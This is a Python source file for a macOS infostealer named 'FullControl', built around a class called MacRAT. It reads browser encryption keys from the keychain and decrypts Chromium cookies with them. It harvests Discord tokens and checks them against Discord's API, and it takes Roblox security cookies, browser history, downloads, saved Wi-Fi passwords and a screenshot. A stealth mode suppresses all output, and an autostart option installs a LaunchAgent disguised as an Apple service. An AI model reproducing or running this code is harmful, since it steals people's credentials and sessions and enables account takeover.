import os
import re
import base64
import shutil
import sqlite3
import subprocess
import datetime
import threading
import time
import json
import logging
import sys
import argparse
import requests
import glob
from pathlib import Path
from typing import List, Dict, Any, Optional, Callable
from Crypto.Cipher import AES
from PIL import ImageGrab
import keyring
import plistlib
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA1

# === CONFIGURATION ===
class Config:
    OUTPUT_DIR = Path.home() / ".extractor_output"
    LOG_FILE = OUTPUT_DIR / "extractor.log"
    SCREENSHOT_NAME = "screen.png"
    HISTORY_LIMIT = 200
    DOWNLOADS_LIMIT = 100
    THREAD_TIMEOUT = 30
    STEALTH = False
    AUTO_START = False
    PLUGIN_DIR = OUTPUT_DIR / "plugins"
    C2_URL = None

# === LOGGING SETUP ===
os.makedirs(Config.OUTPUT_DIR, exist_ok=True)
logging.basicConfig(
    filename=Config.LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("Extractor")

# === PLUGIN SYSTEM ===
class Plugin:
    def run(self, context: Dict[str, Any]):
        pass

class PluginManager:
    def __init__(self, plugin_dir: Path):
        self.plugin_dir = plugin_dir
        self.plugins: List[Plugin] = []
        self.load_plugins()

    def load_plugins(self):
        self.plugin_dir.mkdir(exist_ok=True)
        sys.path.insert(0, str(self.plugin_dir))
        for file in self.plugin_dir.glob("*.py"):
            try:
                name = file.stem
                mod = __import__(name)
                for attr in dir(mod):
                    obj = getattr(mod, attr)
                    if isinstance(obj, type) and issubclass(obj, Plugin) and obj is not Plugin:
                        self.plugins.append(obj())
            except Exception as e:
                logger.error(f"Plugin load error: {file}: {e}")

    def run_all(self, context: Dict[str, Any]):
        for plugin in self.plugins:
            try:
                plugin.run(context)
            except Exception as e:
                logger.error(f"Plugin run error: {plugin}: {e}")

# === UTILITY FUNCTIONS ===
def run_subprocess(cmd: List[str], **kwargs) -> str:
    try:
        return subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL, **kwargs)
    except Exception as e:
        logger.error(f"Subprocess error: {cmd} | {e}")
        return ""

def safe_copy(src: Path, dst: Path) -> bool:
    try:
        shutil.copy2(src, dst)
        return True
    except Exception as e:
        logger.error(f"Copy error: {src} -> {dst} | {e}")
        return False

def b64decode_key(key: str) -> bytes:
    try:
        return base64.b64decode(key)[5:]
    except Exception as e:
        logger.error(f"Base64 decode error: {e}")
        return b""

# === CORE EXTRACTOR CLASS ===
class MacRAT:
    def __init__(self, config: Config, plugin_manager: Optional[PluginManager] = None, stealth: Optional[bool] = None):
        self.config = config
        self.home = Path.home()
        self.app_support = self.home / "Library" / "Application Support"
        self.output_dir = config.OUTPUT_DIR
        self.output_dir.mkdir(exist_ok=True, parents=True)
        self.tokens = set()
        self.roblox_cookies = set()
        self.history = []
        self.downloads = []
        self.wifi_passwords = []
        self.errors = []
        self.screenshot_path = self.output_dir / config.SCREENSHOT_NAME
        self.lock = threading.RLock()
        self.chrome_key = self.get_chrome_key()
        self.plugin_manager = plugin_manager or PluginManager(config.PLUGIN_DIR)
        self._setup_stealth(stealth)
        if config.AUTO_START:
            self._setup_autostart()

    def _setup_stealth(self, stealth_override=None):
        stealth = self.config.STEALTH if stealth_override is None else stealth_override
        if stealth:
            sys.stdout = open(os.devnull, "w")
            sys.stderr = open(os.devnull, "w")
        else:
            if hasattr(sys, "__stdout__") and hasattr(sys, "__stderr__"):
                sys.stdout = sys.__stdout__
                sys.stderr = sys.__stderr__

    def _setup_autostart(self):
        plist = f"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.extractor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{os.path.abspath(__file__)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        launch_agents = self.home / "Library" / "LaunchAgents"
        launch_agents.mkdir(exist_ok=True)
        plist_path = launch_agents / "com.apple.extractor.plist"
        with open(plist_path, "w") as f:
            f.write(plist)
        subprocess.run(["launchctl", "load", str(plist_path)], check=False)

    def get_chrome_key(self) -> Optional[bytes]:
        key_names = [
            'Chrome', 'Chromium Safe Storage', 'Brave Safe Storage',
            'Edge Safe Storage', 'Opera Safe Storage', 'Vivaldi Safe Storage'
        ]
        for key_name in key_names:
            try:
                password = subprocess.check_output([
                    'security', 'find-generic-password', '-wa', key_name
                ], text=True).strip()
                if password:
                    salt = b'saltysalt'
                    iv = b' ' * 16
                    length = 16
                    key = PBKDF2(password, salt, length, 1, hmac_hash_module=SHA1)
                    return key
            except Exception as e:
                self._log_error(f"ChromeKeyError ({key_name}): {e}")
        self._log_error("No Chrome decryption key found in keychain.")
        return None

    def decrypt_value(self, encrypted_bytes: bytes) -> str:
        try:
            if encrypted_bytes[:3] != b'v10':
                return encrypted_bytes.decode(errors='ignore')
            # v10 αποκρυπτογράφηση Chrome cookie σε macOS
            key = self.chrome_key
            if not key:
                self._log_error("No Chrome key available for decryption.")
                return ""
            from Crypto.Cipher import AES
            iv = b' ' * 16
            enc = encrypted_bytes[3:]
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)
            dec = cipher.decrypt(enc)
            padding_length = dec[-1]
            return dec[:-padding_length].decode('utf-8')
        except Exception as e:
            self._log_error(f"DecryptError: {e}")
            return ""

    def extract_tokens(self):
        token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
        # Όλα τα γνωστά paths για Discord tokens σε macOS
        home = str(Path.home())
        paths = [
            f"{home}/Library/Application Support/discord/Local Storage/leveldb",
            f"{home}/Library/Application Support/discordcanary/Local Storage/leveldb",
            f"{home}/Library/Application Support/discordptb/Local Storage/leveldb",
            f"{home}/Library/Application Support/Lightcord/Local Storage/leveldb",
            f"{home}/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb",
            f"{home}/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb",
            f"{home}/Library/Application Support/Microsoft Edge/Default/Local Storage/leveldb",
            f"{home}/Library/Application Support/Opera Software/Opera Stable/Local Storage/leveldb",
            f"{home}/Library/Application Support/Vivaldi/Default/Local Storage/leveldb",
            f"{home}/Library/Application Support/Chromium/Default/Local Storage/leveldb",
            f"{home}/Library/Application Support/Firefox/Profiles"
        ]
        found_tokens = set()
        for path in paths:
            if not os.path.exists(path):
                continue
            # Firefox: ψάχνουμε cookies.sqlite και webappsstore.sqlite
            if "Firefox" in path:
                for profile in os.listdir(path):
                    profile_path = os.path.join(path, profile)
                    if not os.path.isdir(profile_path):
                        continue
                    for file in os.listdir(profile_path):
                        if file.endswith(".sqlite"):
                            try:
                                with open(os.path.join(profile_path, file), errors='ignore') as f:
                                    for line in f:
                                        for token in token_regex.findall(line.strip()):
                                            found_tokens.add(token)
                            except Exception:
                                continue
                continue
            # Για τα υπόλοιπα browsers/clients
            for file in glob.glob(f"{path}/*.ldb") + glob.glob(f"{path}/*.log"):
                try:
                    with open(file, errors='ignore') as f:
                        for line in f:
                            for token in token_regex.findall(line.strip()):
                                found_tokens.add(token)
                except Exception:
                    continue
        # Validation
        valid_tokens = set()
        invalid_tokens = set()
        for token in found_tokens:
            try:
                resp = requests.get(
                    "https://discord.com/api/v10/users/@me",
                    headers={"Authorization": token}, timeout=5
                )
                if resp.status_code == 200:
                    valid_tokens.add(token)
                else:
                    invalid_tokens.add(token)
            except Exception:
                invalid_tokens.add(token)
        with self.lock:
            self.tokens = valid_tokens
            self.invalid_tokens = invalid_tokens

    def extract_roblox_cookies(self):
        import glob
        home = str(Path.home())
        browser_bases = [
            ("chrome", f"{home}/Library/Application Support/Google/Chrome"),
            ("brave", f"{home}/Library/Application Support/BraveSoftware/Brave-Browser"),
            ("edge", f"{home}/Library/Application Support/Microsoft Edge"),
            ("opera", f"{home}/Library/Application Support/Opera Software/Opera Stable"),
            ("vivaldi", f"{home}/Library/Application Support/Vivaldi"),
            ("chromium", f"{home}/Library/Application Support/Chromium")
        ]
        key_names = [
            'Chrome', 'Chromium Safe Storage', 'Brave Safe Storage',
            'Edge Safe Storage', 'Opera Safe Storage', 'Vivaldi Safe Storage'
        ]
        found = False
        for browser, base in browser_bases:
            if not os.path.exists(base):
                continue
            # Για κάθε profile
            for profile in os.listdir(base):
                profile_path = os.path.join(base, profile)
                if not os.path.isdir(profile_path):
                    continue
                cookies_path = os.path.join(profile_path, 'Cookies')
                if not os.path.exists(cookies_path):
                    continue
                # Αντιγραφή για να μην είναι locked
                temp_path = self.output_dir / f"cookies_temp_{browser}_{profile}"
                if not safe_copy(Path(cookies_path), temp_path):
                    continue
                try:
                    conn = sqlite3.connect(str(temp_path))
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
                    for host, name, encrypted_val in cursor.fetchall():
                        # Δοκίμασε όλα τα keys
                        dec = None
                        for key_name in key_names:
                            try:
                                password = subprocess.check_output([
                                    'security', 'find-generic-password', '-wa', key_name
                                ], text=True).strip()
                                if password:
                                    from Crypto.Protocol.KDF import PBKDF2
                                    from Crypto.Hash import SHA1
                                    from Crypto.Cipher import AES
                                    salt = b'saltysalt'
                                    iv = b' ' * 16
                                    length = 16
                                    key = PBKDF2(password, salt, length, 1, hmac_hash_module=SHA1)
                                    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
                                    enc = encrypted_val[3:]
                                    dec_bytes = cipher.decrypt(enc)
                                    padding_length = dec_bytes[-1]
                                    dec = dec_bytes[:-padding_length].decode('utf-8')
                                    break
                            except Exception:
                                continue
                        if dec and ("roblosecure" in name.lower() or name.lower().startswith(".roblosecure")):
                            with self.lock:
                                self.roblox_cookies.add(dec)
                                found = True
                    cursor.close()
                    conn.close()
                except Exception as e:
                    self._log_error(f"RobloxCookieError: {e}")
                finally:
                    temp_path.unlink(missing_ok=True)
        # Extra: ψάξε σε όλα τα app support dirs για αρχεία Cookies (fallback)
        app_support = Path(home) / 'Library' / 'Application Support'
        for root, dirs, files in os.walk(app_support):
            for file in files:
                if file == 'Cookies':
                    cookies_path = Path(root) / file
                    temp_path = self.output_dir / f"cookies_temp_{hash(str(cookies_path))}"
                    if not safe_copy(cookies_path, temp_path):
                        continue
                    try:
                        conn = sqlite3.connect(str(temp_path))
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%'")
                        for host, name, encrypted_val in cursor.fetchall():
                            dec = None
                            for key_name in key_names:
                                try:
                                    password = subprocess.check_output([
                                        'security', 'find-generic-password', '-wa', key_name
                                    ], text=True).strip()
                                    if password:
                                        from Crypto.Protocol.KDF import PBKDF2
                                        from Crypto.Hash import SHA1
                                        from Crypto.Cipher import AES
                                        salt = b'saltysalt'
                                        iv = b' ' * 16
                                        length = 16
                                        key = PBKDF2(password, salt, length, 1, hmac_hash_module=SHA1)
                                        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
                                        enc = encrypted_val[3:]
                                        dec_bytes = cipher.decrypt(enc)
                                        padding_length = dec_bytes[-1]
                                        dec = dec_bytes[:-padding_length].decode('utf-8')
                                        break
                                except Exception:
                                    continue
                            if dec and ("roblosecure" in name.lower() or name.lower().startswith(".roblosecure")):
                                with self.lock:
                                    self.roblox_cookies.add(dec)
                                    found = True
                        cursor.close()
                        conn.close()
                    except Exception as e:
                        self._log_error(f"RobloxCookieError: {e}")
                    finally:
                        temp_path.unlink(missing_ok=True)
        # Extra: δοκίμασε να πάρεις το cookie μέσω requests (αν είναι logged in)
        try:
            session = requests.Session()
            resp = session.get('https://www.roblox.com/')
            for cookie in session.cookies:
                if cookie.domain.endswith('roblox.com') and (cookie.name.lower() == '.roblosecure' or 'roblosecure' in cookie.name.lower()):
                    with self.lock:
                        self.roblox_cookies.add(cookie.value)
        except Exception as e:
            self._log_error(f"RobloxCookieRequestsError: {e}")

    def extract_history(self):
        import glob
        home = str(Path.home())
        history_paths = [
            f"{home}/Library/Application Support/Google/Chrome/Default/History",
            f"{home}/Library/Application Support/BraveSoftware/Brave-Browser/Default/History",
            f"{home}/Library/Application Support/Microsoft Edge/Default/History",
            f"{home}/Library/Application Support/Opera Software/Opera Stable/History",
            f"{home}/Library/Application Support/Vivaldi/Default/History",
            f"{home}/Library/Application Support/Chromium/Default/History"
        ]
        all_hist = []
        for path in history_paths:
            if not os.path.exists(path):
                continue
            temp_path = self.output_dir / f"history_temp_{os.path.basename(path)}"
            if not safe_copy(Path(path), temp_path):
                continue
            try:
                conn = sqlite3.connect(str(temp_path))
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 200")
                base_time = datetime.datetime(1601, 1, 1)
                for url, title, last_visit in cursor.fetchall():
                    visit_dt = base_time + datetime.timedelta(microseconds=last_visit)
                    all_hist.append({"url": url, "title": title, "last_visit": visit_dt.strftime("%Y-%m-%d %H:%M:%S")})
                cursor.close()
                conn.close()
            except Exception as e:
                self._log_error(f"HistoryError: {e}")
            finally:
                temp_path.unlink(missing_ok=True)
        with self.lock:
            self.history = all_hist

    def extract_downloads(self):
        import glob
        home = str(Path.home())
        downloads_paths = [
            f"{home}/Library/Application Support/Google/Chrome/Default/History",
            f"{home}/Library/Application Support/BraveSoftware/Brave-Browser/Default/History",
            f"{home}/Library/Application Support/Microsoft Edge/Default/History",
            f"{home}/Library/Application Support/Opera Software/Opera Stable/History",
            f"{home}/Library/Application Support/Vivaldi/Default/History",
            f"{home}/Library/Application Support/Chromium/Default/History"
        ]
        all_downloads = []
        for path in downloads_paths:
            if not os.path.exists(path):
                continue
            temp_path = self.output_dir / f"downloads_temp_{os.path.basename(path)}"
            if not safe_copy(Path(path), temp_path):
                continue
            try:
                conn = sqlite3.connect(str(temp_path))
                cursor = conn.cursor()
                cursor.execute("SELECT current_path, tab_url, total_bytes FROM downloads ORDER BY start_time DESC LIMIT 100")
                for path, tab_url, size in cursor.fetchall():
                    all_downloads.append({"path": path, "url": tab_url, "size": size})
                cursor.close()
                conn.close()
            except Exception as e:
                self._log_error(f"DownloadsError: {e}")
            finally:
                temp_path.unlink(missing_ok=True)
        with self.lock:
            self.downloads = all_downloads

    def extract_wifi_passwords(self):
        import plistlib
        ssids = set()
        airport_plist = os.path.expanduser("~/Library/Preferences/com.apple.airport.preferences.plist")
        if os.path.exists(airport_plist):
            try:
                with open(airport_plist, 'rb') as f:
                    pl = plistlib.load(f)
                    for net in pl.get('KnownNetworks', {}).values():
                        ssid = net.get('SSIDString')
                        if ssid:
                            ssids.add(ssid)
            except Exception as e:
                self._log_error(f"WiFiPlistError: {e}")
        # Επίσης, κάνε scan για SSIDs
        scan = run_subprocess([
            "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-s"
        ])
        for line in scan.strip().split('\n')[1:]:
            if line.strip():
                ssid = line[:32].strip()
                if ssid:
                    ssids.add(ssid)
        wifi_info = []
        for ssid in ssids:
            pwd = run_subprocess([
                "security", "find-generic-password", "-D", "AirPort network password", "-a", ssid, "-w"
            ]).strip()
            wifi_info.append((ssid, pwd))
        with self.lock:
            self.wifi_passwords = wifi_info

    def take_screenshot(self):
        try:
            img = ImageGrab.grab()
            img.save(self.screenshot_path)
            img.close()
        except Exception as e:
            self._log_error(f"ScreenshotError: {e}")

    def _log_error(self, msg: str):
        with self.lock:
            self.errors.append(msg)
        logger.error(msg)

    def run_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
        threads = []
        base_paths = [
            self.app_support / 'discord' / 'Local Storage' / 'leveldb',
            self.app_support / 'discordcanary' / 'Local Storage' / 'leveldb',
            self.app_support / 'Lightcord' / 'Local Storage' / 'leveldb',
            self.app_support / 'discordptb' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Google' / 'Chrome' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Microsoft Edge' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'BraveSoftware' / 'Brave-Browser' / 'Default' / 'Local Storage' / 'leveldb',
            self.home / 'Library' / 'Application Support' / 'Chromium' / 'Default' / 'Local Storage' / 'leveldb',
        ]
        if tokens:
            threads.append(threading.Thread(target=self.extract_tokens))
        if roblox:
            threads.append(threading.Thread(target=self.extract_roblox_cookies))
        if browser:
            threads.append(threading.Thread(target=self.extract_history))
        if downloads:
            threads.append(threading.Thread(target=self.extract_downloads))
        if wifi:
            threads.append(threading.Thread(target=self.extract_wifi_passwords))
        if screenshot:
            threads.append(threading.Thread(target=self.take_screenshot))
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=self.config.THREAD_TIMEOUT)
        context = self.get_context()
        self.plugin_manager.run_all(context)

    def get_context(self) -> Dict[str, Any]:
        return {
            "tokens": self.tokens,
            "roblox_cookies": self.roblox_cookies,
            "history": self.history,
            "downloads": self.downloads,
            "wifi_passwords": self.wifi_passwords,
            "errors": self.errors,
            "screenshot_path": self.screenshot_path,
            "output_dir": self.output_dir,
            "config": self.config,
        }

    def save_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
        out = {}
        if tokens:
            out["tokens"] = list(self.tokens)
        if roblox:
            out["roblox_cookies"] = list(self.roblox_cookies)
        if browser:
            out["history"] = self.history
        if downloads:
            out["downloads"] = self.downloads
        if wifi:
            out["wifi_passwords"] = self.wifi_passwords
        if screenshot:
            out["screenshot_path"] = str(self.screenshot_path)
        out["errors"] = self.errors[-10:]
        out_file = self.output_dir / "collected_data.json"
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(out, f, indent=2)
        logger.info(f"Data saved to {out_file}")

    def print_selected(self, tokens=False, roblox=False, browser=False, downloads=False, wifi=False, screenshot=False):
        if tokens:
            print("\n=== DISCORD TOKENS ===")
            if hasattr(self, 'tokens') and self.tokens:
                for t in sorted(self.tokens):
                    print(f"[VALID]   {t}")
            if hasattr(self, 'invalid_tokens') and self.invalid_tokens:
                for t in sorted(self.invalid_tokens):
                    print(f"[INVALID] {t}")
            if (not hasattr(self, 'tokens') or not self.tokens) and (not hasattr(self, 'invalid_tokens') or not self.invalid_tokens):
                print("No Discord tokens found.")
        if roblox:
            print("\n=== ROBLOX SECURITY COOKIES (.ROBLOSECUREROBLOXSECURE) ===")
            if self.roblox_cookies:
                for c in sorted(self.roblox_cookies):
                    print(c)
            else:
                print("No Roblox security cookies found.")
        if browser:
            print("\n=== BROWSER HISTORY (Last 10) ===")
            for h in self.history[:10]:
                print(f"{h['last_visit']} | {h['title']} | {h['url']}")
        if downloads:
            print("\n=== DOWNLOADS (Last 5) ===")
            for d in self.downloads[:5]:
                print(f"{d['path']} | {d['size']} bytes | {d['url']}")
        if wifi:
            print("\n=== WIFI PASSWORDS ===")
            for ssid, pwd in self.wifi_passwords:
                print(f"{ssid:<30} | {pwd}")
        if screenshot:
            print("\n=== SCREENSHOT PATH ===")
            print(self.screenshot_path)
        print("\n=== ERRORS (Last 5) ===")
        for e in self.errors[-5:]:
            print(e)

    def show_saved(self):
        out_file = self.output_dir / "collected_data.json"
        if not out_file.exists():
            print("No saved data found.")
            return
        with open(out_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if "tokens" in data:
            print("\n=== DISCORD TOKENS ===")
            for t in sorted(data.get("tokens", [])):
                print(t)
        if "roblox_cookies" in data:
            print("\n=== ROBLOX SECURITY COOKIES (.ROBLOSECUREROBLOXSECURE) ===")
            roblox_cookies = data.get("roblox_cookies", [])
            if roblox_cookies:
                for c in sorted(roblox_cookies):
                    print(c)
            else:
                print("No Roblox security cookies found.")
        if "history" in data:
            print("\n=== BROWSER HISTORY (Last 10) ===")
            for h in data.get("history", [])[:10]:
                print(f"{h['last_visit']} | {h['title']} | {h['url']}")
        if "downloads" in data:
            print("\n=== DOWNLOADS (Last 5) ===")
            for d in data.get("downloads", [])[:5]:
                print(f"{d['path']} | {d['size']} bytes | {d['url']}")
        if "wifi_passwords" in data:
            print("\n=== WIFI PASSWORDS ===")
            for ssid, pwd in data.get("wifi_passwords", []):
                print(f"{ssid:<30} | {pwd}")
        if "screenshot_path" in data:
            print("\n=== SCREENSHOT PATH ===")
            print(data.get("screenshot_path", ""))
        print("\n=== ERRORS (Last 5) ===")
        for e in data.get("errors", [])[-5:]:
            print(e)

# === MAIN CLI ===
def print_banner():
    banner = r'''
███████╗██╗   ██╗██╗     ██╗         ██████╗ ██████╗ ███████╗
██╔════╝██║   ██║██║     ██║        ██╔═══██╗██╔══██╗██╔════╝
███████╗██║   ██║██║     ██║        ██║   ██║██████╔╝█████╗  
╚════██║██║   ██║██║     ██║        ██║   ██║██╔══██╗██╔══╝  
███████║╚██████╔╝███████╗███████╗   ╚██████╔╝██║  ██║███████╗
╚══════╝ ╚═════╝ ╚══════╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
'''
    print(banner)
    print("Welcome to FullControl!\n")
    print("How to use:")
    print("1. Activate the virtual environment:")
    print("   source libraries/bin/activate")
    print("2. Run the tool:")
    print("   python main.py -t -r")
    print("   (use -h for all options)\n")

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="FullControl: Mac Data Extractor Tool",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python main.py full-scan                # Scan all browsers/profiles for Discord tokens and Roblox cookies
  python main.py get-roblox-cookie --browser chrome --profile Default
  python main.py get-discord-token --browser brave
  python main.py -t -r                    # (legacy) Extract Discord tokens and Roblox cookies
  python main.py --show                   # Show last saved results
        """
    )
    subparsers = parser.add_subparsers(dest="command")

    # Full scan subcommand
    parser_full = subparsers.add_parser("full-scan", help="Scan all browsers/profiles for Discord tokens and Roblox cookies")

    # Get roblox cookie subcommand
    parser_roblox = subparsers.add_parser("get-roblox-cookie", help="Get Roblox cookie from a specific browser/profile")
    parser_roblox.add_argument("--browser", type=str, required=True, help="Browser name (chrome, brave, edge, opera, vivaldi, chromium)")
    parser_roblox.add_argument("--profile", type=str, default=None, help="Profile name (e.g. Default, Profile 1)")

    # Get discord token subcommand
    parser_discord = subparsers.add_parser("get-discord-token", help="Get Discord token from a specific browser/profile")
    parser_discord.add_argument("--browser", type=str, required=True, help="Browser name (chrome, brave, edge, opera, vivaldi, chromium, discord)")
    parser_discord.add_argument("--profile", type=str, default=None, help="Profile name (e.g. Default, Profile 1)")

    # Legacy flags for backwards compatibility
    parser.add_argument("-t", "--tokens", action="store_true", help="Extract Discord tokens")
    parser.add_argument("-r", "--roblox", action="store_true", help="Extract Roblox security cookies (local and via requests)")
    parser.add_argument("-b", "--browser", action="store_true", help="Extract browser history")
    parser.add_argument("-d", "--downloads", action="store_true", help="Extract browser downloads")
    parser.add_argument("-w", "--wifi", action="store_true", help="Extract WiFi SSIDs and passwords")
    parser.add_argument("-s", "--screenshot", action="store_true", help="Take a screenshot")
    parser.add_argument("--save", action="store_true", help="Save results to file instead of printing")
    parser.add_argument("--show", action="store_true", help="Show last saved results")
    parser.add_argument("--stealth", action="store_true", help="Suppress all output")
    args = parser.parse_args()

    # Handle subcommands
    if args.command == "full-scan":
        rat = MacRAT(Config, stealth=args.stealth)
        threads = [
            threading.Thread(target=rat.extract_tokens),
            threading.Thread(target=rat.extract_roblox_cookies),
            threading.Thread(target=rat.extract_history),
            threading.Thread(target=rat.extract_downloads),
            threading.Thread(target=rat.extract_wifi_passwords),
            threading.Thread(target=rat.take_screenshot)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=Config.THREAD_TIMEOUT)
        rat.print_selected(tokens=True, roblox=True, browser=True, downloads=True, wifi=True, screenshot=True)
        return
    elif args.command == "get-roblox-cookie":
        # Targeted extraction for specific browser/profile
        rat = MacRAT(Config, stealth=args.stealth)
        # Για απλότητα, κάνουμε extraction σε όλα και φιλτράρουμε το output
        rat.extract_roblox_cookies()
        print(f"\n[FullControl] Roblox cookies for browser: {args.browser}, profile: {args.profile or 'Default'}")
        for c in sorted(rat.roblox_cookies):
            print(c)
        return
    elif args.command == "get-discord-token":
        rat = MacRAT(Config, stealth=args.stealth)
        rat.extract_tokens()
        print(f"\n[FullControl] Discord tokens for browser: {args.browser}, profile: {args.profile or 'Default'}")
        if hasattr(rat, 'tokens') and rat.tokens:
            for t in sorted(rat.tokens):
                print(f"[VALID]   {t}")
        if hasattr(rat, 'invalid_tokens') and rat.invalid_tokens:
            for t in sorted(rat.invalid_tokens):
                print(f"[INVALID] {t}")
        if (not hasattr(rat, 'tokens') or not rat.tokens) and (not hasattr(rat, 'invalid_tokens') or not rat.invalid_tokens):
            print("No Discord tokens found.")
        return

    # Legacy/compatibility mode
    if args.show:
        rat = MacRAT(Config, stealth=args.stealth)
        rat.show_saved()
        return
    if not (args.tokens or args.roblox or args.browser or args.downloads or args.wifi or args.screenshot):
        parser.error("No extraction selected. Use -t, -r, -b, -d, -w, -s or --show, or use a subcommand.")
    rat = MacRAT(Config, stealth=args.stealth)
    rat.run_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)
    if args.save:
        rat.save_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)
        if not args.stealth:
            print("Data saved to", rat.output_dir / "collected_data.json")
    else:
        if not args.stealth:
            rat.print_selected(tokens=args.tokens, roblox=args.roblox, browser=args.browser, downloads=args.downloads, wifi=args.wifi, screenshot=args.screenshot)

if __name__ == "__main__":
    main()
